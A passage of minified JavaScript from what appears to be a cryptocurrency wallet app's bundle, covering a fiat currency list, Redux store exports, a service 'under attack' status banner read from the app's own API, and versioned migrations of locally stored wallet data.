            ticker: "MXN",
            title: "Mexican Peso",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "MYR",
            title: "Malaysian Ringgit",
            isFiat: !0,
            icon: "RM"
        }, {
            ticker: "NOK",
            title: "Norwegian Krone",
            isFiat: !0,
            icon: "NKr"
        }, {
            ticker: "NZD",
            title: "New Zealand Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "PHP",
            title: "Philippine Peso",
            isFiat: !0,
            icon: "₱"
        }, {
            ticker: "PLN",
            title: "Polish Złoty",
            isFiat: !0,
            icon: "zł"
        }, {
            ticker: "RON",
            title: "Romanian Leu",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "RUB",
            title: "Russian Ruble",
            isFiat: !0,
            icon: "₽"
        }, {
            ticker: "SEK",
            title: "Swedish Krona",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "SGD",
            title: "Singapore Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "THB",
            title: "Thai Baht",
            isFiat: !0,
            icon: "฿"
        }, {
            ticker: "TRY",
            title: "Turkish Lira",
            isFiat: !0,
            icon: "₺"
        }, {
            ticker: "ZAR",
            title: "South African Rand",
            isFiat: !0,
            icon: "R"
        }, {
            ticker: "AED",
            title: "Dirham",
            isFiat: !0,
            icon: "Dh"
        }, {
            ticker: "PKR",
            title: "Pakistan Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "NGN",
            title: "Naira",
            isFiat: !0,
            icon: "₦"
        }, {
            ticker: "TWD",
            title: "New Taiwan Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "KRW",
            title: "Won",
            isFiat: !0,
            icon: "₩"
        }, {
            ticker: "MAD",
            title: "Moroccan Dirham",
            isFiat: !0,
            icon: "د.م."
        }, {
            ticker: "UAH",
            title: "Hryvnia",
            isFiat: !0,
            icon: "₴"
        }, {
            ticker: "ALL",
            title: "Albanian Lek",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "AMD",
            title: "Armenian Dram",
            isFiat: !0,
            icon: "֏"
        }, {
            ticker: "ANG",
            title: "Netherlands Antillean Guilder",
            isFiat: !0,
            icon: "NAƒ"
        }, {
            ticker: "BAM",
            title: "Bosnian Convertible Mark",
            isFiat: !0,
            icon: "KM"
        }, {
            ticker: "BBD",
            title: "Barbadian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BDT",
            title: "Bangladeshi Taka",
            isFiat: !0,
            icon: "Tk"
        }, {
            ticker: "BMD",
            title: "Bermudian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BND",
            title: "Brunei Dollar ",
            isFiat: !0,
            icon: "B$"
        }, {
            ticker: "BOB",
            title: "Bolivian Boliviano",
            isFiat: !0,
            icon: "Bs"
        }, {
            ticker: "BWP",
            title: " Botswanan Pula ",
            isFiat: !0,
            icon: "P"
        }, {
            ticker: "BYN",
            title: "Belarusian Ruble",
            isFiat: !0,
            icon: "Br"
        }, {
            ticker: "DJF",
            title: "Djiboutian Franc",
            isFiat: !0,
            icon: "Franc"
        }, {
            ticker: "EGP",
            title: "Egyptian Pound",
            isFiat: !0,
            icon: "E£"
        }, {
            ticker: "GHS",
            title: "Ghanaian Cedi",
            isFiat: !0,
            icon: "GH¢"
        }, {
            ticker: "GTQ",
            title: "Guatemalan Quetzal",
            isFiat: !0,
            icon: "Q"
        }, {
            ticker: "HNL",
            title: "Honduran Lempira",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "JMD",
            title: "Jamaican Dollar",
            isFiat: !0,
            icon: "J$"
        }, {
            ticker: "KES",
            title: " Kenyan Shilling",
            isFiat: !0,
            icon: "KSh"
        }, {
            ticker: "KGS",
            title: "Kyrgyzstani Som",
            isFiat: !0,
            icon: "лв"
        }, {
            ticker: "KHR",
            title: "Cambodian Riel",
            isFiat: !0,
            icon: "៛"
        }, {
            ticker: "KYD",
            title: "Caymanian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "LBP",
            title: "Lebanese Pound",
            isFiat: !0,
            icon: "ل.ل"
        }, {
            ticker: "LKR",
            title: "Sri Lankan Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "MKD",
            title: "Macedonian Denar",
            isFiat: !0,
            icon: "ден"
        }, {
            ticker: "MNT",
            title: "Mongolian Tughrik",
            isFiat: !0,
            icon: "₮"
        }, {
            ticker: "MOP",
            title: "Macau Pataca",
            isFiat: !0,
            icon: "MOP$"
        }, {
            ticker: "MUR",
            title: "Mauritian Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "MZN",
            title: "Mozambican metical ",
            isFiat: !0,
            icon: "MT"
        }, {
            ticker: "PAB",
            title: "Panamanian Balboa",
            isFiat: !0,
            icon: "B/."
        }, {
            ticker: "PGK",
            title: "Papua New Guinean Kina",
            isFiat: !0,
            icon: "K"
        }, {
            ticker: "PYG",
            title: "Paraguayan Guarani",
            isFiat: !0,
            icon: "Gs"
        }, {
            ticker: "RSD",
            title: "Serbian Dinar ",
            isFiat: !0,
            icon: "din"
        }, {
            ticker: "SOS",
            title: "Somali Shilling",
            isFiat: !0,
            icon: "S"
        }, {
            ticker: "TTD",
            title: "Trinidadian Dollar",
            isFiat: !0,
            icon: "TT$"
        }, {
            ticker: "TZS",
            title: "Tanzanian Shilling",
            isFiat: !0,
            icon: "Shilling"
        }, {
            ticker: "UGX",
            title: "Ugandan Shilling",
            isFiat: !0,
            icon: "UGX"
        }, {
            ticker: "XAF",
            title: "Central African CFA franc",
            isFiat: !0,
            icon: "CFA"
        }, {
            ticker: "ZMW",
            title: " Zambian Kwacha",
            isFiat: !0,
            icon: "ZK"
        }]
    }
    ,
    59070: (e, t, a) => {
        "use strict";
        a.r(t);
        var n = {};
        a.r(n);
        a.d(n, {
            changeMasterPassword: () => changeMasterPassword,
            checkMasterPassword: () => checkMasterPassword,
            clearSecureStorage: () => clearSecureStorage,
            decodeStorageByPassword: () => decodeStorageByPassword,
            doLogout: () => doLogout,
            getSecureData: () => getSecureData,
            initialState: () => pt,
            isSetMasterPassword: () => oe.Oj,
            isStorageData: () => oe.Yq,
            patchMigrations: () => patchMigrations,
            reducer: () => vt,
            restoreStorage: () => restoreStorage,
            secureStorageEvents: () => ft,
            setSecureData: () => setSecureData,
            storageFlush: () => storageFlush,
            storeKey: () => yt,
            whitelist: () => Et,
            withSecureStorageRestoreInProgress: () => withSecureStorageRestoreInProgress
        });
        var r = {};
        a.r(r);
        a.d(r, {
            Theme: () => Nt,
            reducer: () => It,
            selectedTheme: () => Ot,
            storeKey: () => Tt,
            whitelist: () => At
        });
        var l = {};
        a.r(l);
        a.d(l, {
            areTokensHiddenSelector: () => ks,
            clearAllHidenWallets: () => clearAllHidenWallets,
            hideWallet: () => hideWallet,
            reducer: () => vs,
            selectedHiddenMode: () => ws,
            selectedHideUnknownTokensMode: () => Ss,
            selectedHideWallets: () => _s,
            selectedZeroBalanceMode: () => bs,
            showWallet: () => showWallet,
            storeKey: () => gs,
            toggleHideMode: () => ds,
            toggleHideTokensMode: () => fs,
            toggleHideUnknownTokensMode: () => Es,
            toggleVisibilityWallet: () => toggleVisibilityWallet,
            toggleZeroBalanceMode: () => ms,
            whitelist: () => ys
        });
        var s = {};
        a.r(s);
        a.d(s, {
            addPendingTx: () => transactions_addPendingTx,
            fetchBuyTransactions: () => fetchBuyTransactions,
            fetchExchangeTransactions: () => fetchExchangeTransactions,
            fetchFioInvoices: () => fetchFioInvoices,
            fetchMultisigTransactions: () => fetchMultisigTransactions,
            fetchSellTransactions: () => fetchSellTransactions,
            initialState: () => mu,
            keyValueWhitelist: () => du,
            reducer: () => hu,
            removeAllTxs: () => gc,
            removeFioTransactionByRequestId: () => removeFioTransactionByRequestId,
            removeTransactionsByWallet: () => removeTransactionsByWallet,
            replaceTxs: () => replaceTxs,
            selectCommonTransactions: () => selectCommonTransactions,
            selectedAllTransactions: () => Eu,
            selectedBuyTxs: () => selectedBuyTxs,
            selectedExchangeTxs: () => selectedExchangeTxs,
            selectedFioTxs: () => selectedFioTxs,
            selectedMultisigTxs: () => selectedMultisigTxs,
            selectedPendingTxs: () => selectedPendingTxs,
            selectedSellTxs: () => selectedSellTxs,
            setTransactions: () => setTransactions,
            storeKey: () => ou,
            updateExchangeTx: () => updateExchangeTx,
            whitelist: () => uu
        });
        var i = {};
        a.r(i);
        a.d(i, {
            WALLET_UPDATE_MIN_INTERVAL: () => ku,
            initializeUpdater: () => ut,
            reducer: () => Pu,
            selectedIsAllBalanceUpdating: () => Bo,
            selectedIsBackupInitialized: () => Ro,
            selectedUpdateInformation: () => Wo,
            storeKey: () => Fo,
            updateAllWallets: () => updateWalletsData_updateAllWallets,
            updateInternalTxs: () => updateInternalTxs,
            updateSomeWallets: () => updateSomeWallets,
            updateWalletsBalanceAndTxs: () => updateWalletsBalanceAndTxs,
            whitelist: () => Iu
        });
        var o = {};
        a.r(o);
        a.d(o, {
            _addWallet: () => _addWallet,
            addSubWallet: () => addSubWallet,
            bulkAddWallets: () => bulkAddWallets,
            fetchMultisigs: () => fetchMultisigs,
            fetchSubWalletsAndUpdate: () => fetchSubWalletsAndUpdate,
            mapWalletsToPlainObjects: () => mapWalletsToPlainObjects,
            reducer: () => cd,
            removeWalletSocketListeners: () => removeWalletSocketListeners,
            replaceAllWallets: () => replaceAllWallets,
            replaceWalletsFromWalletModels: () => replaceWalletsFromWalletModels,
            restoreWallets: () => restoreWallets,
            saveWalletsWithPassword: () => saveWalletsWithPassword,
            setActiveWallet: () => setActiveWallet,
            setBalanceByWallet: () => setBalanceByWallet,
            setWalletBalancesWereUpdatedByRest: () => setWalletBalancesWereUpdatedByRest,
            setWalletSocketListeners: () => setWalletSocketListeners,
            setWalletTxsWereUpdatedByRest: () => setWalletTxsWereUpdatedByRest,
            setWalletsSocketListeners: () => setWalletsSocketListeners,
            startSocketManager: () => startSocketManager,
            storeKey: () => ld,
            triggerSaveWallets: () => triggerSaveWallets,
            whitelist: () => sd
        });
        var c = {};
        a.r(c);
        a.d(c, {
            reducer: () => bd,
            selectedCache: () => selectedCache,
            setCacheKey: () => setCacheKey,
            storeKey: () => _d,
            whitelist: () => wd
        });
        var u = {};
        a.r(u);
        a.d(u, {
            TYPE_BUY_CONFIRM: () => Yd,
            TYPE_BUY_PAGE: () => Zd,
            TYPE_BUY_RIGHT_BLOCK: () => tm,
            TYPE_COIN_STATUS: () => sm,
            TYPE_CREATE_POPUP: () => nm,
            TYPE_EXCHANGE_CONFIRM: () => $d,
            TYPE_EXCHANGE_PAGE: () => jd,
            TYPE_EXCHANGE_RIGHT_BLOCK: () => em,
            TYPE_IMPORT_POPUP: () => am,
            TYPE_LEDGER_POPUP: () => rm,
            TYPE_LEFT_MENU: () => lm,
            TYPE_RECEIVE_PAGE: () => qd,
            TYPE_RECEIVE_PAGE_STAKING: () => Xd,
            TYPE_SEND_CONFIRM: () => zd,
            TYPE_SEND_PAGE: () => Hd,
            TYPE_SEND_RIGHT_BLOCK: () => Jd,
            TYPE_STACKING_PAGE: () => Qd
        });
        var d = {};
        a.r(d);
        a.d(d, {
            fetchNotifications: () => fetchNotifications,
            reducer: () => mm,
            selectedNotifications: () => selectedNotifications,
            storeKey: () => cm,
            whitelist: () => um
        });
        var m = {};
        a.r(m);
        a.d(m, {
            DOWNLOAD_TYPE: () => Sm,
            getSetting: () => getSetting,
            handleDownload: () => handleDownload,
            hasSetting: () => hasSetting,
            reducer: () => Am,
            selectedBackupFilename: () => xm,
            setFilenameBackupToStore: () => setFilenameBackupToStore,
            storeKey: () => Nm,
            updateSetting: () => updateSetting,
            whitelist: () => Cm
        });
        var p = {};
        a.r(p);
        a.d(p, {
            acceptCookie: () => acceptCookie,
            reducer: () => ek,
            selectedCookieStatus: () => tk,
            storeKey: () => Xb,
            whitelist: () => Qb
        });
        var f = {};
        a.r(f);
        a.d(f, {
            UPDATE_NEW_WALLETS: () => kA,
            reducer: () => NA,
            selectedNewList: () => selectedNewList,
            selectedNewWallets: () => selectedNewWallets,
            setNewWallet: () => setNewWallet,
            storeKey: () => CA,
            whitelist: () => SA
        });
        var E = {};
        a.r(E);
        a.d(E, {
            reducer: () => cB,
            selectedTxKeysById: () => uB,
            setTxKey: () => setTxKey,
            storeKey: () => lB,
            whitelist: () => oB
        });
        var h = {};
        a.r(h);
        a.d(h, {
            closeReferralBanner: () => closeReferralBanner,
            reducer: () => $j,
            selectedReferralBannerStatus: () => selectedReferralBannerStatus,
            storeKey: () => Hj,
            whitelist: () => zj
        });
        var g = {};
        a.r(g);
        a.d(g, {
            activateReferralLink: () => activateReferralLink,
            createExchangeWithRewardForRefProg: () => createExchangeWithRewardForRefProg,
            createReferrerLink: () => createReferrerLink,
            getReferralStats: () => getReferralStats,
            getReferrerLinks: () => getReferrerLinks,
            getTokenPrice: () => getTokenPrice,
            reducer: () => c$,
            storeKey: () => l$,
            whitelist: () => s$
        });
        var y = {};
        a.r(y);
        a.d(y, {
            createExchangeTransaction: () => createExchangeTransaction,
            getAvailableCurrencies: () => getAvailableCurrencies,
            getExchangeTransaction: () => getExchangeTransaction,
            reducer: () => Pre,
            selectedPartner: () => selectedPartner,
            storeKey: () => Ire,
            whitelist: () => xre
        });
        var v = {};
        a.r(v);
        a.d(v, {
            paymentReducer: () => eoe,
            storeKey: () => qie,
            whitelist: () => Xie
        });
        var _ = {};
        a.r(_);
        a.d(_, {
            reducer: () => soe,
            storeKey: () => noe,
            whitelist: () => roe
        });
        var w = {};
        a.r(w);
        a.d(w, {
            ADD_NEW_CLO_WITHDRAW: () => uoe,
            REMOVE_CLO_WITHDRAW: () => doe,
            addNewCloWithdraw: () => addNewCloWithdraw,
            reducer: () => moe,
            removeCloWithdraw: () => removeCloWithdraw,
            selectedCloWithdraw: () => selectedCloWithdraw,
            storeKey: () => ooe,
            whitelist: () => coe
        });
        var b = {};
        a.r(b);
        a.d(b, {
            filterPartners: () => filterPartners,
            paymentReducer: () => eoe,
            reducer: () => Loe,
            storeKey: () => qie,
            whitelist: () => Xie
        });
        var k = a(10072)
          , S = a(23042)
          , C = a(99137)
          , N = a(71957)
          , T = a(96306)
          , A = a(103)
          , x = a(74592)
          , I = a(58276)
          , P = a(35082)
          , L = a(12813)
          , F = a(18222)
          , W = a(38563)
          , R = a(50336)
          , B = a(7512);
        if ("undefined" == typeof FinalizationRegistry) {
            const e = void 0 !== a.g ? a.g : window;
            e && (e.FinalizationRegistry = class {
                constructor(e) {
                    this.cleanupCallback = e;
                    this.registry = new Map
                }
                register(e, t, a) {
                    void 0 !== a && this.registry.set(a, t)
                }
                unregister(e) {
                    this.registry.delete(e)
                }
                _manualCleanup() {
                    for (const e of this.registry.values())
                        this.cleanupCallback(e);
                    this.registry.clear()
                }
            }
            )
        }
        var O = a(67294)
          , D = a(73935)
          , M = a(13196)
          , U = a(86575);
        const G = "cache-stats"
          , V = "cache-key"
          , attack_manager_platform = () => (0,
        M.p1)() ? "extension" : (0,
        M.d)() ? "desktop" : "web";
        let K = !1;
        class AttackManager {
            static setIsDirty() {
                K = !0
            }
            static isDirty() {
                return K
            }
            static isUnderAttack() {
                return !!localStorage && "true" == localStorage.getItem(G)
            }
            static getMessage() {
                return atob(localStorage.getItem(V))
            }
            static async handleAlert(e) {
                const t = undefined;
                if (!await AttackManager.fetchStatus()) {
                    const t = {
                        isUnderAttack: !0,
                        underAttackMessage: e.underAttackMessage,
                        mobile: e.platforms.includes("mobile"),
                        web: e.platforms.includes("web"),
                        desktop: e.platforms.includes("desktop"),
                        extension: e.platforms.includes("extension")
                    };
                    AttackManager.updateUnderAttackStatus(t)
                }
            }
            static updateUnderAttackStatus(e) {
                const t = AttackManager.isUnderAttack()
                  , a = !(!e.isUnderAttack || !e[attack_manager_platform()]);
                localStorage.setItem(G, a);
                try {
                    localStorage.setItem(V, btoa(e.underAttackMessage))
                } catch (e) {
                    console.info(e)
                }
                if (window) {
                    if (t === a)
                        return;
                    window.location.reload()
                }
            }
            static async fetchStatus() {
                try {
                    const {data: e} = await U.Ht.get("api/v1/settings/status");
                    if (e && e.underAttack) {
                        const {underAttack: t} = e;
                        AttackManager.updateUnderAttackStatus(t)
                    }
                    return !0
                } catch (e) {
                    console.info(e);
                    return !1
                }
            }
        }
        var H = a(41143)
          , z = a.n(H)
          , j = a(5977)
          , $ = a(28216)
          , Z = a(78603)
          , Y = a(73727)
          , q = a(37283)
          , X = a(38862)
          , Q = a(81354)
          , J = a(28256)
          , ee = a(12587)
          , te = a(91757);
        const ae = (0,
        te.createAction)("LOGOUT")()
          , ne = (0,
        te.createAction)("CLEAR_ALL_DATA")()
          , re = (0,
        te.createAction)("CLEAR_LOGOUT_REASON")()
          , le = (0,
        te.createAction)("SET_LOGOUT_REASON")()
          , se = (0,
        te.createAction)("SET_RESTORE_IN_PROGRESS")()
          , ie = {
            setMasterPassword: (0,
            te.createAction)("@SECURE.setMasterPassword")(),
            setMasterPasswordCommit: (0,
            te.createAction)("@SECURE.setMasterPasswordCommit.COMMIT")(),
            replaceStorage: (0,
            te.createAction)("@SECURE.replaceStorage")(),
            replaceStorageCommit: (0,
            te.createAction)("@SECURE.replaceStorageCommit.COMMIT")(),
            storageSaveAndTryFlush: (0,
            te.createAction)("@SECURE.storageSaveAndTryFlushCase")(),
            storageSaveAndTryFlushCommit: (0,
            te.createAction)("@SECURE.storageSaveAndTryFlushCase.COMMIT")(),
            mapDecryptedSecureStorage: (0,
            te.createAction)("@SECURE.mapDecryptedSecureStorage")(),
            saveBackup: (0,
            te.createAction)("@SECURE.saveBackup")()
        };
        var oe = a(6391)
          , ce = a(31672)
          , ue = a(2490)
          , de = a(59461)
          , me = a(15581)
          , pe = a(34514);
        const v1_private_keys = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 1)
                return e;
            Object.assign(e, {
                version: 1
            });
            try {
                if (!e.privateKeys || !e.wallets)
                    return e;
                const findByAddress = t => e.privateKeys.find((e => {
                    let {address: a} = e;
                    return a === t
                }
                ));
                e.wallets.forEach((e => {
                    const t = findByAddress(e.address);
                    t && Object.assign(e, {
                        privateKey: t.privateKey
                    });
                    return e
                }
                ));
                delete e.privateKeys
            } catch (e) {}
            return e
        }
          , v2_balance = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 2)
                return e;
            Object.assign(e, {
                version: 2
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    "string" != typeof e.balance && Object.assign(e, {
                        balance: 0
                    });
                    return e
                }
                ))
            } catch (e) {}
            return e
        };
        var fe = a(88449)
          , Ee = a(59849)
          , he = a(42155)
          , ge = a(919);
        const ye = ["eth", "etc", "clo", "exp", "joys"]
          , v3_tokens = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 3)
                return e;
            Object.assign(e, {
                version: 3
            });
            if (!e.wallets)
                return e;
            try {
                e.wallets.forEach((t => {
                    if (!t)
                        return;
                    "bchsv" === t.currency && Object.assign(t, {
                        currency: "bsv"
                    });
                    "eth" !== t.currency && (t.subWallets = t.subWallets || []);
                    if (t.subWallets)
                        return;
                    const a = e.wallets.filter((e => e.privateKey && e.privateKey === t.privateKey && -1 === ye.indexOf(e.currency)));
                    Object.assign(t, {
                        subWallets: JSON.parse(JSON.stringify(a))
                    })
                }
                ));
                e.wallets = e.wallets.filter((e => !!e && !(e.address.indexOf("0x") > -1 && e.smartContract)));
                e.wallets.forEach((e => {
                    e.uuid || Object.assign(e, {
                        uuid: (0,
                        he.Z)().slice(0, 8)
                    });
                    e.subWallets.forEach((t => {
                        t.uuid || Object.assign(t, {
                            uuid: (0,
                            he.Z)().slice(0, 8)
                        });
                        t.family || Object.assign(t, {
                            family: e.currency
                        })
                    }
                    ))
                }
                ));
                delete e.tokens;
                void 0 === e["autobackup-setting"] && Object.assign(e, {
                    "autobackup-setting": 62
                })
            } catch (t) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V3, t);
                return e
            }
            return e
        }
          , v4_eos = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 4)
                return e;
            Object.assign(e, {
                version: 4
            });
            if (!e.wallets)
                return e;
            try {
                e.wallets.forEach((e => {
                    "eos-coin" === e.currency && Object.assign(e, {
                        currency: "eos"
                    })
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V4, e)
            }
            return e
        };
        var ve = a(18913);
        const v5_balances = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (!e.wallets)
                return e;
            try {
                const updateWallet = e => {
                    "string" != typeof e.balance && "number" != typeof e.balance && Object.assign(e, {
                        balance: 0
                    });
                    Number.isNaN(parseFloat(1 * e.balance)) && Object.assign(e, {
                        balance: 0
                    })
                }
                  , updateFixedTitle = e => {
                    Object.assign(e, {
                        title: (0,
                        ve.Z)(e.title)
                    })
                }
                ;
                e.wallets.forEach((e => {
                    updateWallet(e);
                    updateFixedTitle(e);
                    e.subWallets && e.subWallets.forEach((e => {
                        updateWallet(e)
                    }
                    ));
                    return e
                }
                ))
            } catch (e) {}
            return e
        }
          , v6_trim = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 6)
                return e;
            Object.assign(e, {
                version: 6
            });
            if (!e.wallets)
                return e;
            try {
                e.wallets.forEach((e => {
                    e.address && Object.assign(e, {
                        address: e.address.trim()
                    });
                    e.subWallets.forEach((e => {
                        e.address && Object.assign(e, {
                            address: e.address.trim()
                        })
                    }
                    ))
                }
                ))
            } catch (e) {}
            return e
        };
        var _e = a(91482);
        const v7_wallet_models = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 7)
                return e;
            Object.assign(e, {
                version: 7
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    let t;
                    if (_e.ZP.isSupported({
                        currency: e.currency,
                        hw: e.hw
                    })) {
                        const a = undefined
                          , n = undefined;
                        t = (new (_e.ZP.getClass({
                            currency: e.currency,
                            hw: e.hw
                        }))).recoverFromPlainObject(e).mapToPlainObject()
                    } else
                        t = e;
                    return t
                }
                ))
            } catch (e) {}
            return e
        };
        var we = a(65811);
        const v8_btc_wallets = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 8)
                return e;
            Object.assign(e, {
                version: 8
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    "btc" !== e.currency || e.hw || Object.assign(e, {
                        type: we.uQ.OVERALL_WALLET,
                        subWalletsHidden: !1
                    })
                }
                ))
            } catch (e) {}
            return e
        };
        var be = a(80552);
        const ke = ee.P.create({
            name: "utils-wallet"
        });
        function getNewTitle(e, t) {
            return `${e} ${t}`
        }
        const patchWalletTitle = (e, t) => {
            try {
                var a, n;
                const r = (null !== (a = e.title) && void 0 !== a ? a : "").trim() || (null === (n = (0,
                be.II)(e.currency)) || void 0 === n ? void 0 : n.title) || "";
                if (e.accountName && (!e.title || !e.title.trim().length)) {
                    e.title = e.accountName;
                    return e
                }
                if (t && t.length) {
                    let a = r
                      , n = !0
                      , l = 1;
                    for (; n; ) {
                        n = !!t.find((e => e.title === a));
                        if (n) {
                            l += 1;
                            a = getNewTitle(r, l)
                        }
                    }
                    if (1 === l) {
                        e.title = r;
                        return e
                    }
                    if (!e.title || !e.title.trim().length) {
                        e.title = a;
                        return e
                    }
                }
                if (!e.title || !e.title.trim().length) {
                    e.title = r;
                    return e
                }
                return e
            } catch (e) {
                ke.error("patchWalletTitle reducer failed", e);
                throw e
            }
        }
          , v9_title = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 9)
                return e;
            Object.assign(e, {
                version: 9
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if ("undefined" === e.title) {
                        e.title = "";
                        patchWalletTitle(e)
                    }
                }
                ))
            } catch (e) {}
            return e
        }
          , v10_backup_uuid = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 10)
                return e;
            Object.assign(e, {
                version: 10
            });
            try {
                if (!e.uuid) {
                    Object.assign(e, {
                        uuid: (0,
                        he.Z)()
                    });
                    return e
                }
            } catch (e) {}
            return e
        };
        var Se = a(17995);
        const v11_yec_failed = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 11)
                return e;
            Object.assign(e, {
                version: 11
            });
            try {
                if (!e.wallets)
                    return e;
                const t = await Se.Z.getApiByCurrency("yec");
                for (const a of e.wallets)
                    if (a && "s1Nc7XLPcgVVRBYtMUAkKGPmihkwxgfmSgr" === a.address) {
                        const {address: e} = await t.getAddressFromPrivateKey(a);
                        a.address = e
                    }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V11, e)
            }
            return e
        }
          , v12_waves_eos_tokens = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 12)
                return e;
            Object.assign(e, {
                version: 12
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    e && "waves" === e.currency && Object.assign(e, {
                        type: we.uQ.WAVES_WALLET,
                        subWalletsHidden: !1
                    });
                    e && "eos" === e.currency && Object.assign(e, {
                        type: we.uQ.EOS_WALLET,
                        subWalletsHidden: !1
                    })
                }
                ))
            } catch (e) {}
            return e
        }
          , v13_trx_tokens = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 13)
                return e;
            Object.assign(e, {
                version: 13
            });
            if (!e.wallets)
                return e;
            try {
                e.wallets.forEach((e => {
                    e && "trx" === e.currency && Object.assign(e, {
                        type: we.uQ.WAVES_WALLET,
                        subWalletsHidden: !1
                    })
                }
                ))
            } catch (e) {}
            return e
        }
          , v14_fix_title = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 14)
                return e;
            try {
                Object.assign(e, {
                    version: 14
                });
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (e && e.currency) {
                        Object.assign(e, {
                            title: (0,
                            ve.Z)(e.title),
                            currency: (0,
                            ve.Z)(e.currency)
                        });
                        e.subWallets && e.subWallets.length && e.subWallets.forEach((e => {
                            Object.assign(e, {
                                title: (0,
                                ve.Z)(e.title),
                                currency: (0,
                                ve.Z)(e.currency)
                            })
                        }
                        ))
                    }
                }
                ))
            } catch (e) {}
            return e
        };
        var Ce = a(53079);
        const v15_bch_bsv_addresses = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 15)
                return e;
            try {
                Object.assign(e, {
                    version: 15
                });
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (e && e.currency)
                        try {
                            "bch" === e.currency && Object.assign(e, {
                                address: (0,
                                Ce.toCashAddress)(e.address)
                            });
                            "bsv" === e.currency && Object.assign(e, {
                                address: (0,
                                Ce.toLegacyAddress)(e.address)
                            })
                        } catch (t) {
                            ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V15, {
                                currency: e.currency,
                                address: e.address
                            }, t)
                        }
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V15, e)
            }
            return e
        }
          , Ne = ["btc", "btc-testnet", "ltc"]
          , v17_btc_multisigs = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 17)
                return e;
            Object.assign(e, {
                version: 17
            });
            try {
                if (!e.wallets)
                    return e;
                for (const t of e.wallets)
                    if (t && Ne.indexOf(t.currency) > -1 && !t.publicKey && t.privateKey)
                        try {
                            const e = await Se.Z.getApiByCurrency(t.currency)
                              , {publicKey: a} = await e.getAddressFromPrivateKey(t);
                            t.publicKey = a
                        } catch (e) {
                            ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V16, e)
                        }
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V16, e)
            }
            return e
        }
          , v18_ledger_eth_derivepath = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 18)
                return e;
            Object.assign(e, {
                version: 18
            });
            try {
                if (!e.wallets)
                    return e;
                e.wallets.forEach((e => {
                    if (e && e.type === we.uQ.ETH_LIKE_LEDGER_WALLET && e.hw === we.Vw.LEDGER)
                        try {
                            if (!e.subWallets || !Array.isArray(e.subWallets))
                                return;
                            if (!e.config || !e.config.derivePath)
                                return;
                            e.subWallets.forEach((t => {
                                t && (t.derivePath = e.config.derivePath)
                            }
                            ))
                        } catch (t) {
                            ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V18, {
                                currency: e.currency,
                                address: e.address
                            }, t)
                        }
                }
                ))
            } catch (e) {
                ge.b.error(ge.d.CANT_PROCESS_MIGRATION_V18, e)
            }
            return e
        }
          , v19_eos_filter_txs = async function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if (e.version >= 19)
                return e;
            Object.assign(e, {
                version: 19
            });
            return e
        }
          , Te = {
            trx: {
                usdt: {
                    title: "TetherUS",
                    smartContract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                    precision: 6
                },
                btt: {
                    title: "BitTorrent",
                    smartContract: "1002000",
                    precision: 6
                },
                win: {
                    title: "WINK",
                    smartContract: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
                    precision: 6
                }
